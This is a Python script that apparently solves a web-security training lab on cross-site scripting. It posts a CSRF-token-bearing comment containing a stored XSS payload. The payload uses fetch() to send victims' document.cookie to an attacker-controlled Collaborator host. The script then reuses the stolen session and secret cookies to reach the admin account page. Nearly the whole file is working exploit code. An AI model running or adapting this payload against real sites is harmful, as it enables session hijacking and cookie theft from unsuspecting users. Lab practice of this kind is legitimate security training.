# Exploiting cross-site scripting to steal cookies

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_xss(s, url, collab):
	form_path = url + '/post?postId=1'
	r = s.get(form_path)
	csrf_token = get_csrf_token(r)
	comment_path = url + '/post/comment'
	xss_payload = '</p><script>fetch("https://' + collab + '",{mode:"no-cors",method:"POST",body:document.cookie})</script>'
	comment_data = {
		"csrf": csrf_token,
		"postId": "1",
		"email": "test@attacker.com",
		"name": "gwyo",
		"website": "",
		"comment": xss_payload
	}
	print('[+] Targeted endpoint or query parameter:\n    %s' % comment_path)
	print('[+] Using payload in website field:\t%s' % xss_payload)
	r = s.post(comment_path, data=comment_data)
	time.sleep(1)
	print('\n[+] Check your Collaborator and give the cookie VALUES to continue...')
	session_cookie = input('Session cookie:\n> ')
	secret_cookie = input('Secret cookie:\n> ')
	cookie = {"secret": secret_cookie, "session": session_cookie}
	return cookie

def show_usage():
	print('[+] Usage: %s <URL> <COLLAB>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com xxxxxxxx.oastify.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Exploiting cross-site scripting to steal cookies')
	try:
		url = sys.argv[1].strip()
		collab = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		print("[+] Trying to send a comment to steal admin's cookie...")
		victim_cookies = send_xss(s, url, collab)
		time.sleep(1)
		print('[+] Trying log in as Admin with stolen Cookie Session...')
		r = s.get(url + "/my-account", cookies=victim_cookies)
		time.sleep(2)
		if r.status_code == 200:
			r = s.get(url)
			if  'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved')
			else:
				print('[+] The Exploit sent the given payload !')
		else:
			print('[-] The Exploit failed <!>')

if __name__ == "__main__":
	main()

